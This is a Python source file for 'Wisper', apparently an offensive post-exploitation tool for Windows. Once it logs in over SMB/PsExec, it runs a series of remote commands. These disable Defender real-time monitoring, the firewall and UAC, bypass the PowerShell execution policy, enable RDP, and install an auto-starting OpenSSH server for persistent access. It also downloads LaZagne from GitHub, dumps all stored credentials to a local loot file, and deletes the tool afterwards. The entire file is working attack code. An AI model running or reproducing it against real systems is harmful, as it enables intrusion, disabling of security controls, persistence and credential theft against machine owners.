#!/usr/bin/python3

from pypsexec.client import Client,SMBResponseException
from argparse import ArgumentParser
from sys import argv,exit
from colorama import Fore,Style

print(f"""{Fore.BLUE}                                     
                 __                 
            ,-~¨^  ^¨-,           _
           /          / ;^-._...,¨/ 
          /          / /         /  
         /          / /         /   
        /          / /         /    
       /,.-:''-,_ / /         /     ██╗    ██╗██╗███████╗██████╗ ███████╗██████╗ 
       _,.-:--._ ^ ^:-._ __../      ██║    ██║██║██╔════╝██╔══██╗██╔════╝██╔══██╗
     /^         / /¨:.._¨__.;       ██║ █╗ ██║██║███████╗██████╔╝█████╗  ██████╔╝
    /          / /      ¨  /        ██║███╗██║██║╚════██║██╔═══╝ ██╔══╝  ██╔══██╗
   /          / /         /         ╚███╔███╔╝██║███████║██║     ███████╗██║  ██║
  /          / /         /           ╚══╝╚══╝ ╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝
 /_,.--:^-._/ /         /                                                        
 ¨           ^¨¨-.___.:^                                       by - Harshit Joshi
                                                               version - 1.00

                                                               
{Style.RESET_ALL}""")

parser = ArgumentParser(epilog=f"Example: {argv[0]} 192.168.101.14 admin P@$$w0rd123",description="Wisper helps to maintain access to windows machine and have some other cool features like UAC Disable,Firewall Disable,Dumping Credentials,etc.")
parser.add_argument('-t','--target',dest="target",help='Target To Exploit')
parser.add_argument('-p','--password',dest="password",help='Password To Login')
parser.add_argument('-u','--user',dest="user",help='Username To Login')
parser.add_argument('-v', '--version', help="print version and exit",action='version',version='%(prog)s 1.00')
args = parser.parse_args()

if not args.target or not args.password or not args.user:
    exit(f"{Fore.RED}{Style.BRIGHT}[-]{Style.RESET_ALL} {argv[0]} -t Target IP -u Username -p Password")

try:
    client = Client(args.target, username=args.user, password=args.password,encrypt=False)
    client.connect()
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Authentication Sucessfull")
except ValueError:
    exit(f"{Fore.RED}{Style.BRIGHT}[-]{Style.RESET_ALL} Could Not Reach To Host")
except SMBResponseException:
    exit(f"{Fore.RED}{Style.BRIGHT}[-]{Style.RESET_ALL} Could Not Authenticate Using Provided Credentials")

try:
    client.create_service()
    stdout, stderr, rc = client.run_executable("powershell",
        arguments='/c Set-MpPreference -DisableRealtimeMonitoring $true')
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} RealTime Monitoring Disabled")
    stdout, stderr, rc = client.run_executable("cmd",
        arguments='/c NetSh Advfirewall set allprofiles state off')
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Firewall Disabled")
    stdout, stderr, rc = client.run_executable("powershell",
        arguments='/c Set-ExecutionPolicy RemoteSigned -Force')
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Powershell Execution Policy Bypassed")
    stdout, stderr, rc = client.run_executable("reg.exe",
        arguments='ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} UAC Disabled")
    stdout, stderr, rc = client.run_executable("reg.exe",
        arguments='add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} RDP Enabled And Started")
    stdout, stderr, rc = client.run_executable("cmd",
        arguments='/c netsh advfirewall firewall set rule group="remote desktop" new enable=Yes')
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Firewall Configured For RDP")
    stdout, stderr, rc = client.run_executable("powershell",
        arguments='/c Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0')
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} OpenSSH Server Installed")
    stdout, stderr, rc = client.run_executable("powershell",
        arguments='/c Start-service sshd')
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} OpenSSH Server Started")
    stdout, stderr, rc = client.run_executable("powershell",
        arguments="/c Set-Service -Name sshd -StartupType 'Automatic'")
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} OpenSSH Server Configured To Run At Startup")
    stdout, stderr, rc = client.run_executable("powershell",
        arguments="/c Get-NetFirewallRule -Name *ssh*'Automatic'")
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Firewall Configured For SSH Server")
    print(f"{Fore.RED}{Style.BRIGHT}[*]{Style.RESET_ALL} You Can Now Login Through SSH Or RDP With Username: {Fore.LIGHTGREEN_EX}{Style.BRIGHT}{args.user}{Style.RESET_ALL} And Password: {Fore.LIGHTGREEN_EX}{Style.BRIGHT}{args.password}{Style.RESET_ALL} Any Time")
    stdout, stderr, rc = client.run_executable("powershell",
        arguments="/c Invoke-WebRequest -Uri https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe -OutFile C:\\Windows\\Temp\\lazagne.exe")
    print(f"{Fore.YELLOW}{Style.BRIGHT}[!]{Style.RESET_ALL} Gathering All Possible Credentials This Could Take A While")
    stdout, stderr, rc = client.run_executable("cmd",
        arguments='/c C:\\Windows\\Temp\\lazagne.exe all')
    file = open('loot.txt','w').write((stdout.decode())[505:])
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} All Gathered Credentials Written To loot.txt")
    stdout, stderr, rc = client.run_executable("cmd",
        arguments='/c del C:\\Windows\\Temp\\lazagne.exe')
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Everything Cleaned Up")
    client.remove_service()
    client.disconnect()
except KeyboardInterrupt:
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Cleaning Up")
    try:
        client.cleanup()
    except SMBResponseException:
        pass
    exit(f"{Fore.RED}{Style.BRIGHT}[-]{Style.RESET_ALL} User Interrupted")
except:
    print(f"{Fore.GREEN}{Style.BRIGHT}[+]{Style.RESET_ALL} Cleaning Up")
    try:
        client.cleanup()
    except SMBResponseException:
        pass
    except:
        raise
